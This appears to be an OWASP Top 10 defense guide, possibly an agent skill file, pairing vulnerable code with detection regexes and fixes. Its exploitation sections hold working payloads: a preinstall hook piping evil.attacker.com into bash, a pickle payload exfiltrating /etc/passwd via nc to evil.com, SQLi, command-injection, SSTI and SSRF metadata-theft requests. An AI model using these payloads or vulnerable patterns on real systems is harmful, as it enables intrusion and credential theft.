# OWASP Top 10 Security Reference & Defense Guide

A definitive vulnerability breakdown, attack mechanics catalogue, automated detection signatures, and concrete remediation recipes for the OWASP Top 10 web application security risks.

---

## Quick Navigation Matrix

| Category | Vulnerability Scope | Primary Attack Vector | Primary Mitigation |
| :--- | :--- | :--- | :--- |
| **A01: Broken Access Control** | IDOR, Path Traversal, Missing Auth Checks | Horizontal/Vertical Escalation, File Escape | Server-side authorization checks, canonical path containment |
| **A02: Cryptographic Failures** | Hardcoded Keys, Weak Hashes, Plaintext Data | Key harvesting, Rainbow tables, Eavesdropping | Env vars, Argon2id/bcrypt, AES-256-GCM, TLS 1.3 |
| **A03: Injection** | SQLi, Command Injection, LDAP, SSTI | Arbitrary query execution, Subprocess breakout | Parameterized statements, argv array execution, sandboxed templates |
| **A04: Insecure Design** | Missing Rate Limits, Flawed Logic, No Re-auth | Credential stuffing, Race conditions, Logic bypass | Token bucket rate limiting, atomic DB transactions, threat modeling |
| **A05: Security Misconfiguration** | Default Creds, Verbose Errors, Permissive CORS | Reconnaissance, Information leakage, Origin bypass | Hardened headers, restricted CORS, generic error handling |
| **A06: Vulnerable Components** | Supply Chain Hooks, Unpinned Deps, Typosquatting | Malicious lifecycle scripts, RCE on install | `npm ci --ignore-scripts`, hash pinning, lockfile auditing |
| **A07: Identification & Auth** | Brute Force, Session Fixation, Weak Passwords | Password spraying, Session hijacking | Exponential backoff, CSPRNG tokens, session regeneration |
| **A08: Software & Data Integrity** | Untrusted Deserialization, Insecure CI/CD | Remote Code Execution via object gadgets | Safe JSON serialization, signed artifacts, pinned GitHub Actions |
| **A09: Logging & Monitoring** | Missing Audit Logs, Log Injection (CRLF) | SIEM blind spots, Log forging, Secret leakage | Structured JSON logging, CRLF stripping, secret masking |
| **A10: SSRF** | Metadata Service Exfiltration, Internal Pivoting | `169.254.169.254`, `localhost` port probing | Strict URL whitelist, post-DNS IP validation, egress firewalling |

---

## A01: Broken Access Control

### 1. Overview & Mechanics
Broken Access Control occurs when access control policies are improperly enforced, permitting users to act outside their intended permissions. Common variants include:
- **Insecure Direct Object References (IDOR):** Endpoints accept user-supplied identifiers (e.g., `user_id`, `invoice_id`) without verifying ownership or tenancy.
- **Path / Directory Traversal:** User input incorporates path traversal sequences (`../`, `..\\`, `%2e%2e%2f`) to access files outside the intended root.
- **Missing Function-Level Access Control:** Administrative endpoints exposed without role or claim checks.
- **HTTP Verb Tampering:** Bypassing security rules that check `GET` but not `POST`, `HEAD`, or `OPTIONS`.

### 2. Vulnerable Code Patterns

#### Python (Flask/FastAPI Path Traversal & IDOR)
```python
# VULNERABLE: Direct path concatenation permits directory traversal
@app.route("/download")
def download_file():
    filename = request.args.get("file")
    filepath = os.path.join("/var/data/uploads", filename)
    return send_file(filepath)  # Exploit: ?file=../../../../etc/passwd


# VULNERABLE: IDOR - trusts client-supplied account_id without ownership check
@app.route("/api/account/<account_id>")
def get_account(account_id):
    # Missing verification that current_user has access to account_id
    return db.query(Account).filter_by(id=account_id).first().to_json()
```

#### TypeScript / Node.js (Express Path Traversal)
```typescript
// VULNERABLE: Direct resolve without containment check
app.get("/view", (req, res) => {
  const target = path.resolve("/var/app/public", req.query.path as string);
  res.sendFile(target); // Exploit: /view?path=../../../../etc/shadow
});
```

### 3. Exploitation Vectors
```bash
# Path traversal targeting Linux sensitive files
curl "https://example.com/download?file=../../../../etc/passwd"
curl "https://example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl "https://example.com/download?file=..%252f..%252f..%252fetc%2fpasswd"

# IDOR horizontal privilege escalation
curl -H "Authorization: Bearer <regular_user_token>" "https://example.com/api/account/1001"
curl -H "Authorization: Bearer <regular_user_token>" "https://example.com/api/account/1002"
```

### 4. Detection Signatures
- **Regex / SAST Patterns:**
  - `path\.(join|resolve)\([^)]*req\.(query|params|body)`
  - `send_file\(os\.path\.join\(`
  - `filter_by\(id\s*=\s*request\.`
- **CLI Command:**
  ```bash
  python3 .agents/skills/cybersec/scripts/cybersec scan ./src --deep
  ```

### 5. Concrete Remediation

#### Python: Safe Path Containment & Session-Bound Authorization
```python
import os
from pathlib import Path
from flask import abort, g


def resolve_safe_path(base_dir: str | Path, untrusted_path: str) -> str:
    """Ensures untrusted_path resolves strictly inside base_dir."""
    base = os.path.realpath(str(base_dir))
    clean_untrusted = untrusted_path.lstrip("/\\")
    target = os.path.realpath(os.path.join(base, clean_untrusted))

    try:
        common = os.path.commonpath([base, target])
    except ValueError:
        raise ValueError("Cross-drive path traversal detected")

    if common != base:
        raise ValueError(
            f"Path traversal detected: {untrusted_path!r} escapes {base_dir!r}"
        )
    return target


@app.route("/api/account/<account_id>")
@require_auth
def get_account_safe(account_id):
    # Enforce ownership check via authenticated session context
    account = (
        db.query(Account)
        .filter_by(id=account_id, tenant_id=g.current_user.tenant_id)
        .first()
    )
    if not account:
        abort(404, "Account not found or access denied")
    return account.to_json()
```

#### TypeScript: Safe Path Containment
```typescript
import * as path from "node:path";

export function resolveSafePath(baseDir: string, untrustedPath: string): string {
  if (untrustedPath.includes("\0")) {
    throw new Error("Invalid path: null byte detected");
  }
  const resolvedBase = path.resolve(baseDir);
  const sanitizedInput = untrustedPath.replace(/^[\/\\]+/, "");
  const resolvedTarget = path.resolve(resolvedBase, sanitizedInput);

  const relative = path.relative(resolvedBase, resolvedTarget);
  if (relative.startsWith("..") || path.isAbsolute(relative)) {
    throw new Error(`Path traversal detected: "${untrustedPath}" escapes base directory`);
  }
  return resolvedTarget;
}
```

---

## A02: Cryptographic Failures

### 1. Overview & Mechanics
Cryptographic failures involve inadequate protection of sensitive data in transit or at rest. Key vulnerabilities:
- **Hardcoded Secrets:** API keys, database credentials, or JWT signing keys committed to git repositories.
- **Broken / Collision-Prone Hashing:** Using MD5 or SHA-1 for passwords, digital signatures, or integrity checks.
- **Weak Cipher Modes:** Using DES, 3DES, RC4, or AES in Electronic Codebook (ECB) mode.
- **Timing Side Channels:** Using string comparison (`===` or `==`) for hashes, tokens, or MACs.

### 2. Vulnerable Code Patterns

#### Python
```python
# VULNERABLE: Hardcoded secret key
SECRET_KEY = "super_secret_jwt_signing_key_production"


# VULNERABLE: MD5 / SHA-1 used for password hashing
def hash_password(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()


# VULNERABLE: Variable-time comparison vulnerable to timing side channels
def verify_token(user_token: str, expected_token: str) -> bool:
    return user_token == expected_token  # Timing leak
```

#### TypeScript
```typescript
// VULNERABLE: Insecure hash for sensitive integrity / tokens
import crypto from "node:crypto";
const hash = crypto.createHash("md5").update(userPassword).digest("hex");

// VULNERABLE: Variable time string comparison
if (signature === expectedSignature) {
  // Timing attack permits iterative character deduction
}
```

### 3. Exploitation Vectors
- **Rainbow Tables & Hashcat:** Cracking unsalted/weak MD5/SHA-1 hashes in seconds.
- **Timing Attacks:** Measuring execution response time variance (down to microseconds) across iterations to deduce tokens byte-by-byte.
- **Secret Extraction:** Scraping committed credentials via `git log -p` or `.env` files exposed over HTTP.

### 4. Detection Signatures
- **Regex / SAST Patterns:**
  - `hashlib\.(md5|sha1)\(`
  - `crypto\.createHash\(['"](md5|sha1)['"]\)`
  - `AKIA[0-9A-Z]{16}` | `ghp_[0-9a-zA-Z]{36}` | `sk-[a-zA-Z0-9]{32,}`
  - `-----BEGIN [A-Z]+ PRIVATE KEY-----`
- **CLI Command:**
  ```bash
  python3 .agents/skills/cybersec/scripts/cybersec scan . --deep
  ```

### 5. Concrete Remediation

#### Python: Argon2id Password Hashing & Constant-Time Comparison
```python
import hmac
import os
import secrets
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(
    time_cost=3, memory_cost=65536, parallelism=4, hash_len=32, salt_len=16
)


def hash_user_password(password: str) -> str:
    return ph.hash(password)


def verify_user_password(hashed_password: str, candidate_password: str) -> bool:
    try:
        return ph.verify(hashed_password, candidate_password)
    except VerifyMismatchError:
        return False


def verify_api_token(provided: str, secret: str) -> bool:
    """Constant-time token validation to eliminate timing leaks."""
    return hmac.compare_digest(provided.encode("utf-8"), secret.encode("utf-8"))
```

#### TypeScript: Timing-Safe Comparison & Web Crypto
```typescript
import * as crypto from "node:crypto";

export function safeCompare(a: string, b: string): boolean {
  const bufA = Buffer.from(a, "utf-8");
  const bufB = Buffer.from(b, "utf-8");
  if (bufA.length !== bufB.length) {
    // Constant time dummy comparison
    crypto.timingSafeEqual(bufA, bufA);
    return false;
  }
  return crypto.timingSafeEqual(bufA, bufB);
}
```

---

## A03: Injection

### 1. Overview & Mechanics
Injection occurs when untrusted user data is sent to an interpreter as part of a command or query. Major types:
- **SQL Injection (SQLi):** Attacker payload breaks out of data context into SQL command syntax.
- **Command Injection:** User input passed to shell interpreters (`/bin/sh`, `cmd.exe`) executing unauthorized host commands.
- **Server-Side Template Injection (SSTI):** Template engines (Jinja2, Pug, Handlebars) evaluate user input as executable code.
- **LDAP Injection:** Unescaped input altering directory query filters.

### 2. Vulnerable Code Patterns

#### Python
```python
# VULNERABLE: SQLi via f-string interpolation
cursor.execute(
    f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
)

# VULNERABLE: Command injection via shell=True
subprocess.Popen(f"ping -c 1 {host_ip}", shell=True, stdout=subprocess.PIPE)

# VULNERABLE: SSTI via Jinja2 from_string
jinja2.Environment().from_string(f"Hello {user_input}").render()
```

#### TypeScript
```typescript
// VULNERABLE: Raw string concatenation in PostgreSQL query
await client.query(`SELECT * FROM products WHERE category = '${req.query.cat}'`);

// VULNERABLE: Command injection in child_process.exec
exec(`git checkout ${req.body.branch}`, (err, stdout) => { ... });
```

### 3. Exploitation Vectors
```bash
# SQL Injection Auth Bypass & Union Extraction
curl -d "username=admin' OR '1'='1'-- &password=x" https://example.com/login
curl "https://example.com/products?cat=' UNION SELECT id, username, password_hash FROM users--"

# Command Injection Payloads
curl "https://example.com/api/ping?ip=127.0.0.1;cat+/etc/passwd"
curl "https://example.com/api/ping?ip=127.0.0.1%0Aid%0A"
curl "https://example.com/api/ping?ip=127.0.0.1\$(whoami)"

# SSTI Remote Code Execution (Jinja2)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 4. Detection Signatures
- **Regex / SAST Patterns:**
  - `(query|execute)\s*\([f'"].*(SELECT|INSERT|UPDATE|DELETE).*\+`
  - `(exec|system|popen)\s*\([^)]*(\+|f['"])`
  - `subprocess\.(run|Popen|call)\(.*shell\s*=\s*True`
- **CLI Command:**
  ```bash
  python3 .agents/skills/cybersec/scripts/cybersec scan ./src --deep
  ```

### 5. Concrete Remediation

#### Python: Parameterized SQL & Safe Process Spawning
```python
import sqlite3
import subprocess

# SECURE: SQL with positional parameter substitution
cursor.execute(
    "SELECT id, username, role FROM users WHERE username = ? AND is_active = 1",
    (username,),
)

# SECURE: Subprocess with explicit argv array (shell=False)
subprocess.run(
    ["/bin/ping", "-c", "1", "--", host_ip],
    shell=False,
    capture_output=True,
    text=True,
    timeout=5,
    check=True,
)
```

#### TypeScript: Parameterized Node-Postgres Queries
```typescript
import { Client } from "pg";

const client = new Client();
await client.connect();

// SECURE: Positional parameters $1, $2 eliminate SQL syntax breakout
const result = await client.query(
  "SELECT id, username, email FROM users WHERE email = $1 AND status = $2",
  [userEmail, "active"]
);
```

---

## A04: Insecure Design

### 1. Overview & Mechanics
Insecure Design represents architectural flaws where security controls were never designed into the system. It encompasses:
- **Lack of Anti-Automation / Rate Limiting:** Exposing sensitive operations (login, password reset, SMS OTP, AI inference) without request throttling.
- **Flawed Business Logic:** Trusting client-side parameters for pricing, quantities, or discounts without server-side validation.
- **Race Conditions (TOCTOU):** Checking account balance before deducting funds in non-atomic operations.

### 2. Vulnerable Code Patterns
```python
# VULNERABLE: Insecure logic trusting client-side price
@app.route("/api/checkout", methods=["POST"])
def checkout():
    data = request.get_json()
    total = data["quantity"] * data["price_per_item"]  # Attacker submits price: 0.01
    charge_card(data["card"], total)


# VULNERABLE: Non-atomic balance deduction prone to race condition
def transfer_funds(from_id, to_id, amount):
    balance = db.query(Account).filter_by(id=from_id).first().balance
    if balance >= amount:
        # Time-of-check to time-of-use (TOCTOU) gap
        db.query(Account).filter_by(id=from_id).update({"balance": balance - amount})
        db.query(Account).filter_by(id=to_id).update({"balance": balance + amount})
```

### 3. Exploitation Vectors
- **Race Condition Attack:** Sending 50 concurrent requests simultaneously to double-spend account balances or apply single-use vouchers multiple times.
- **Credential Stuffing:** Bombarding authentication endpoints with millions of leaked credential pairs due to missing rate limiting.

### 4. Detection Signatures
- Endpoints processing financial/state changes lacking database locks or idempotency keys.
- Absence of rate limiting middleware on public APIs.

### 5. Concrete Remediation

#### In-Memory Sliding Window Rate Limiter (Python)
```python
import collections
import time


class SlidingWindowRateLimiter:

    def __init__(self, max_requests: int, window_seconds: float):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.records: dict[str, collections.deque] = collections.defaultdict(
            collections.deque
        )

    def is_allowed(self, client_key: str) -> bool:
        now = time.monotonic()
        cutoff = now - self.window_seconds
        queue = self.records[client_key]

        while queue and queue[0] < cutoff:
            queue.popleft()

        if len(queue) < self.max_requests:
            queue.append(now)
            return True
        return False
```

#### Atomic Database Operations (PostgreSQL `SELECT ... FOR UPDATE`)
```python
# SECURE: Row-level lock prevents race conditions
with db.session.begin():
    account = (
        db.session.query(Account)
        .filter_by(id=from_id)
        .with_for_update()  # Locks record until transaction commits
        .first()
    )
    if account.balance < amount:
        raise ValueError("Insufficient balance")
    account.balance -= amount
    recipient = (
        db.session.query(Account)
        .filter_by(id=to_id)
        .with_for_update()
        .first()
    )
    recipient.balance += amount
```

---

## A05: Security Misconfiguration

### 1. Overview & Mechanics
Security Misconfiguration occurs when components are default-configured, improperly hardened, or left open:
- **Default Credentials:** Leaving administrative dashboards protected by default passwords (`admin:admin`, `root:root`).
- **Verbose Error Messages:** Leaking complete stack traces, SQL queries, or internal directory layouts to clients.
- **Permissive CORS:** Setting `Access-Control-Allow-Origin: *` while simultaneously allowing credentials.
- **Missing HTTP Security Headers:** Omitting `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security`.

### 2. Vulnerable Code Patterns

#### Python / Flask
```python
# VULNERABLE: Debug mode enabled in production
app.run(host="0.0.0.0", port=5000, debug=True)
```

#### TypeScript / Express
```typescript
// VULNERABLE: Overly permissive CORS in Express
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Credentials", "true"); // Incompatible or exploited
  next();
});
```

### 3. Exploitation Vectors
- **Stack Trace Fingerprinting:** Extracting database credentials or library versions from 500 error outputs.
- **Cross-Origin Data Theft:** Malicious websites issuing cross-origin requests to read sensitive JSON responses via permissive CORS.

### 4. Detection Signatures
- **Regex / SAST Patterns:**
  - `debug\s*=\s*True`
  - `Access-Control-Allow-Origin.*\*`
  - Missing headers in `cybersec host` or `cybersec scan`.

### 5. Concrete Remediation

#### Hardened HTTP Security Headers Middleware (Python / ASGI)
```python
async def security_headers_middleware(scope, receive, send):
    if scope["type"] != "http":
        return await app(scope, receive, send)

    async def send_wrapper(message):
        if message["type"] == "http.response.start":
            headers = message.setdefault("headers", [])
            headers.append((b"x-frame-options", b"DENY"))
            headers.append((b"x-content-type-options", b"nosniff"))
            headers.append(
                (b"strict-transport-security", b"max-age=63072000; includeSubDomains; preload")
            )
            headers.append(
                (b"content-security-policy", b"default-src 'self'; frame-ancestors 'none'; object-src 'none';")
            )
            headers.append((b"referrer-policy", b"strict-origin-when-cross-origin"))
        await send(message)

    await app(scope, receive, send_wrapper)
```

#### TypeScript (Express Security Headers & Restricted CORS)
```typescript
import cors from "cors";
import helmet from "helmet";

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        objectSrc: ["'none'"],
        frameAncestors: ["'none'"],
      },
    },
    hsts: { maxAge: 63072000, includeSubDomains: true, preload: true },
    noSniff: true,
  })
);

app.use(
  cors({
    origin: ["https://app.example.com", "https://admin.example.com"],
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE"],
  })
);
```

---

## A06: Vulnerable and Outdated Components

### 1. Overview & Mechanics
Applications built using third-party packages inherit the vulnerabilities of their entire dependency graph:
- **Malicious Lifecycle Scripts:** `package.json` hooks (`preinstall`, `postinstall`, `install`) executing shell commands or downloading remote binaries.
- **Unpinned / Wildcard Dependencies:** Using `*`, `latest`, or broad ranges (`^`, `~`) that automatically download newly compromised versions.
- **Typosquatting & Dependency Confusion:** Uploading packages with names resembling legitimate internal packages or public libraries.

### 2. Vulnerable Manifest Patterns

#### `package.json`
```json
{
  "name": "vulnerable-app",
  "dependencies": {
    "compromised-lib": "*",
    "evil-package": "https://github.com/attacker/repo.git#main"
  },
  "scripts": {
    "preinstall": "curl -s https://evil.attacker.com/beacon.sh | bash"
  }
}
```

#### `requirements.txt`
```text
flask
requests>=2.0.0
--extra-index-url https://untrusted-pypi-mirror.com/simple
malicious-typosquat-packge
```

### 3. Exploitation Vectors
- **Automated RCE on `npm install`:** Attackers publish a version containing a `postinstall` script reading `~/.aws/credentials` or `process.env` and POSTing them to a remote C2.
- **Lockfile Hijacking:** Tampering with package integrity hashes or repository URLs.

### 4. Detection Signatures
- **Regex / SAST Patterns:**
  - `"(preinstall|postinstall|install)"\s*:\s*".*(curl|wget|bash|sh|eval)`
  - `"dependencies"\s*:\s*\{[^}]*"\*"`
- **CLI Command:**
  ```bash
  python3 .agents/skills/cybersec/scripts/cybersec deps package.json --json
  python3 .agents/skills/cybersec/scripts/cybersec deps requirements.txt --json
  ```

### 5. Concrete Remediation
1. **Disable Lifecycle Scripts in CI:**
   ```bash
   npm ci --ignore-scripts
   ```
2. **Configure `.npmrc`:**
   ```ini
   ignore-scripts=true
   save-exact=true
   package-lock=true
   ```
3. **Pin Exact Hashes and Audit Regularly:**
   ```bash
   pip install --require-hashes -r requirements.txt
   npm audit --audit-level=high
   ```

---

## A07: Identification and Authentication Failures

### 1. Overview & Mechanics
Flaws in user identity confirmation, session management, or credential handling:
- **Missing Brute-Force Throttling:** Permitting unlimited credential guesses.
- **Session Fixation:** Reusing an existing session identifier across an authentication state transition.
- **Weak Random Number Generators:** Using non-cryptographic RNGs (`Math.random()`, `random.random()`) for reset tokens or session identifiers.
- **Insecure Cookies:** Omitting `HttpOnly`, `Secure`, and `SameSite` flags.

### 2. Vulnerable Code Patterns
```python
# VULNERABLE: Insecure random number generation for sensitive tokens
import random


def generate_reset_token():
    return str(random.randint(100000, 999999))  # Predictable PRNG seed


# VULNERABLE: Session ID not regenerated upon successful login
@app.route("/login", methods=["POST"])
def login():
    if verify_creds(request.form["user"], request.form["pass"]):
        # Keeps old session cookie, enabling session fixation attacks
        session["authenticated"] = True
```

### 3. Exploitation Vectors
- **Session Fixation:** Attacker assigns a known session cookie to a victim via URL or subdomain injection; once victim logs in, attacker uses the same session cookie.
- **PRNG State Reconstruction:** Observing several consecutive `Math.random()` or `random.random()` outputs to reconstruct the internal seed state and predict all future reset tokens.

### 4. Detection Signatures
- `Math\.random\(\)` or `random\.(random|randint)\(` used in context of tokens, keys, salts, or passwords.
- Cookie headers lacking `HttpOnly; Secure; SameSite=Strict`.

### 5. Concrete Remediation

#### Cryptographically Secure Token Generation (Python)
```python
import secrets


def generate_secure_token() -> str:
    """Generates 256 bits of CSPRNG entropy encoded as base64-url string."""
    return secrets.token_urlsafe(32)


def regenerate_session_on_login(session_dict: dict, user_id: str):
    """Prevents session fixation by destroying old session identifier."""
    session_dict.clear()
    session_dict["user_id"] = user_id
    session_dict["session_id"] = secrets.token_hex(32)
```

#### TypeScript: Secure Cookie Dispatch
```typescript
res.cookie("session_token", secureToken, {
  httpOnly: true, // Prevents XSS cookie access
  secure: true, // Requires HTTPS transmission
  sameSite: "strict", // Prevents CSRF attacks
  maxAge: 3600 * 1000, // 1 hour expiration
  path: "/",
});
```

---

## A08: Software and Data Integrity Failures

### 1. Overview & Mechanics
Occurs when code and infrastructure protect against integrity violations inadequately:
- **Untrusted Deserialization:** Deserializing attacker-controlled binary or structured streams using formats that support arbitrary code execution (`pickle`, `PyYAML` full loader, `node-serialize`, PHP `unserialize`).
- **Insecure CI/CD Pipelines:** Using unpinned GitHub Actions (e.g. `uses: actions/checkout@main`), or interpolating untrusted issue/PR comments into workflow bash commands.
- **Unverified Artifacts:** Auto-updating binaries without cryptographic signature verification (Ed25519 / GPG).

### 2. Vulnerable Code Patterns
```python
# VULNERABLE: Insecure deserialization via pickle
import pickle


@app.route("/api/state", methods=["POST"])
def load_state():
    state_bytes = request.get_data()
    return pickle.loads(state_bytes)  # Attacker can achieve arbitrary RCE


# VULNERABLE: PyYAML default loader
import yaml

data = yaml.load(untrusted_yaml, Loader=yaml.Loader)
```

```yaml
# VULNERABLE: GitHub Actions command injection via PR title
- name: Echo PR Title
  run: echo "PR title is ${{ github.event.pull_request.title }}"
```

### 3. Exploitation Vectors
```python
# Python Pickle RCE Exploit Payload
import base64
import os
import pickle


class Exploit(object):

    def __reduce__(self):
        return (os.system, ("cat /etc/passwd | nc evil.com 9001",))


payload = base64.b64encode(pickle.dumps(Exploit()))
```

### 4. Detection Signatures
- **Regex / SAST Patterns:**
  - `pickle\.(loads?|Unpickler)\(`
  - `yaml\.load\(.*Loader\s*=\s*(yaml\.)?Loader`
  - `uses:\s*[^@\n]+@(main|master|latest)`
  - `\$\{\{\s*github\.event\.(issue|pull_request)\.(title|body)`
- **CLI Command:**
  ```bash
  python3 .agents/skills/cybersec/scripts/cybersec scan . --deep
  ```

### 5. Concrete Remediation
1. **Use Strict JSON or Proto3 Serialization:**
```python
import json

# SECURE: Pure data format with zero code execution semantics
safe_data = json.loads(untrusted_payload)
```
2. **Safe YAML Parsing:**
```python
import yaml

# SECURE: SafeLoader restricts parsing to standard scalars and lists
safe_data = yaml.safe_load(untrusted_yaml)
```
3. **GitHub Actions Input Parameter Sanitization:**
```yaml
- name: Secure PR Title Processing
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    # Access via environment variable, preventing bash argument injection
    printf 'PR title: %s\n' "$PR_TITLE"
```

---

## A09: Security Logging and Monitoring Failures

### 1. Overview & Mechanics
Without adequate logging and monitoring, breaches cannot be detected, triaged, or contained:
- **Missing Audit Logs:** Failing to log authentication attempts, privilege elevations, access control denials, or payment operations.
- **Log Injection (CRLF Injection):** Allowing untrusted user input containing newline characters (`\r\n`) to be written to logs, enabling attackers to forge log lines or blind log parsers.
- **Logging Sensitive Data:** Writing cleartext credentials, credit card numbers, or session tokens into application log streams.

### 2. Vulnerable Code Patterns
```python
# VULNERABLE: Log injection via unescaped username
@app.route("/login", methods=["POST"])
def login():
    user = request.form["username"]
    logger.warning(
        f"Failed login attempt for user: {user}"
    )  # Exploit: user = "alice\n[2026-10-31] INFO: Root login successful"


# VULNERABLE: Logging cleartext credentials
logger.info(f"Registering user with payload: {request.get_json()}")
```

### 3. Exploitation Vectors
- **Log Forgery Payload:**
  ```text
  GET /login?user=guest%0A%5B2026-10-31T12%3A00%3A00Z%5D%20INFO%20Auth%3A%20User%20admin%20authenticated%20successfully
  ```
- **Splunk / ELK Parsing Denial of Service:** Sending massive multi-line payloads to disrupt regex-based log indexing.

### 4. Detection Signatures
- `logger\.(info|debug|warning|error)\(.*f['"][^}]*(req|request|params)` without sanitization.
- Inspection of log files for attack traces:
  ```bash
  python3 .agents/skills/cybersec/scripts/cybersec triage /var/log/nginx/access.log --type=web
  python3 .agents/skills/cybersec/scripts/cybersec triage /var/log/auth.log --type=auth
  ```

### 5. Concrete Remediation

#### Structured JSON Logging & CRLF Stripping (Python)
```python
import json
import logging
import re
import sys


def sanitize_log_value(val: str) -> str:
    """Strips control characters, newlines, and carriage returns."""
    return re.sub(r"[\r\n\x00-\x1f\x7f-\x9f]", " ", str(val))


class JsonLogFormatter(logging.Formatter):

    def format(self, record: logging.LogRecord) -> str:
        log_payload = {
            "timestamp": self.formatTime(record, self.datefmt),
            "level": record.levelname,
            "message": sanitize_log_value(record.getMessage()),
            "logger": record.name,
        }
        if hasattr(record, "security_context"):
            log_payload["context"] = record.security_context
        return json.dumps(log_payload)


# Setup logger
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(JsonLogFormatter())
logger = logging.getLogger("secops")
logger.addHandler(handler)
logger.setLevel(logging.INFO)
```

---

## A10: Server-Side Request Forgery (SSRF)

### 1. Overview & Mechanics
SSRF flaws occur when a web application fetches a remote resource without validating the destination user-supplied URL. Attackers leverage SSRF to:
- **Query Cloud Metadata Services:** Steal IAM role credentials via `http://169.254.169.254/latest/meta-data/` (AWS) or `http://metadata.google.internal/computeMetadata/v1/` (GCP).
- **Pivot to Internal Services:** Scan and exploit services listening on `localhost` or private subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) such as Redis (`6379`), Elasticsearch (`9200`), Docker daemon (`2375`).
- **Bypass Egress Restrictions via DNS Rebinding:** Resolving a public hostname that responds with a public IP on initial validation, but returns `127.0.0.1` when the client library issues the actual HTTP request.

### 2. Vulnerable Code Patterns
```python
# VULNERABLE: Direct URL fetching without validation
import requests
from flask import request


@app.route("/api/fetch-avatar")
def fetch_avatar():
    url = request.args.get("avatar_url")
    resp = requests.get(url)  # Exploit: ?avatar_url=http://169.254.169.254/...
    return resp.content, 200, {"Content-Type": "image/png"}
```

### 3. Exploitation Vectors
```bash
# AWS IMDSv1 Metadata Theft
curl "https://example.com/api/fetch-avatar?avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Google Cloud Metadata Service Exfiltration
curl "https://example.com/api/fetch-avatar?avatar_url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Internal Service Port Probing & RCE
curl "https://example.com/api/fetch-avatar?avatar_url=http://127.0.0.1:6379/CONFIG%20GET%20*"
```

### 4. Detection Signatures
- **Regex / SAST Patterns:**
  - `(requests|urllib\.request|http\.get|fetch|axios)\([^)]*req\.(query|body|params)`
- **CLI Command:**
  ```bash
  python3 .agents/skills/cybersec/scripts/cybersec scan . --deep
  ```

### 5. Concrete Remediation

#### Hardened SSRF Validator with Post-DNS IP Verification (Python)
```python
import ipaddress
import socket
from urllib.parse import urlparse
import requests


def validate_and_fetch_url(
    target_url: str, allowed_schemes=("http", "https"), timeout=5
) -> bytes:
    """Safely fetches a remote URL, rejecting private/loopback/cloud-metadata IP targets

    and mitigating DNS rebinding attacks.
    """
    parsed = urlparse(target_url)
    if parsed.scheme.lower() not in allowed_schemes:
        raise ValueError(f"Disallowed scheme: {parsed.scheme}")

    hostname = parsed.hostname
    if not hostname:
        raise ValueError("Invalid URL: missing hostname")

    # Resolve all associated IP addresses
    try:
        addr_info = socket.getaddrinfo(
            hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
        )
    except socket.gaierror:
        raise ValueError(f"Could not resolve hostname: {hostname}")

    resolved_ips = [item[4][0] for item in addr_info]

    for ip_str in resolved_ips:
        ip = ipaddress.ip_address(ip_str)
        # Block private, loopback, link-local, multicast, and AWS/cloud metadata
        if (
            ip.is_private
            or ip.is_loopback
            or ip.is_link_local
            or ip.is_multicast
            or ip.is_reserved
            or ip_str == "169.254.169.254"
        ):
            raise PermissionError(f"SSRF Target Blocked: {ip_str}")

    # Fetch with redirects disabled to prevent open redirect bypass
    resp = requests.get(
        target_url, allow_redirects=False, timeout=timeout, stream=True
    )
    if 300 <= resp.status_code < 400:
        raise PermissionError("HTTP redirects disallowed on outbound requests")

    return resp.content
```

> [!WARNING] DNS Rebinding TOCTOU (Time-of-Check to Time-of-Use) Hazard
> In simple pre-flight validation where DNS is resolved separately prior to calling an HTTP client library, a classic TOCTOU window exists: an attacker's custom authoritative DNS server can return a benign public IP (with TTL=0) during pre-flight `socket.getaddrinfo`, but return `127.0.0.1` or `169.254.169.254` when the HTTP client re-resolves the hostname to make the actual request.
>
> **Robust Production Defenses against DNS Rebinding TOCTOU:**
> 1. **Pin Request Destination to Verified IP:** Rewrite the target URL using the verified IP address directly (e.g., `https://<resolved_ip>/path`) and preserve original domain routing via an explicit `Host: <hostname>` header, disabling automatic HTTP redirect following.
> 2. **Custom Transport / Socket Resolution:** Override the HTTP transport adapter's socket connection resolver (e.g., using `urllib3.util.connection` in Python or Node.js `http.request({ lookup: customLookup })`) to guarantee the connection is established exclusively to the pre-checked IP.
> 3. **Isolated Egress Proxy / Network Firewalls:** Direct outbound requests through a dedicated hardened egress proxy (e.g., Squid, Envoy, or Smokescreen) enforcing network-level iptables/eBPF blocks on link-local (`169.254.0.0/16`) and RFC 1918 private CIDR ranges.
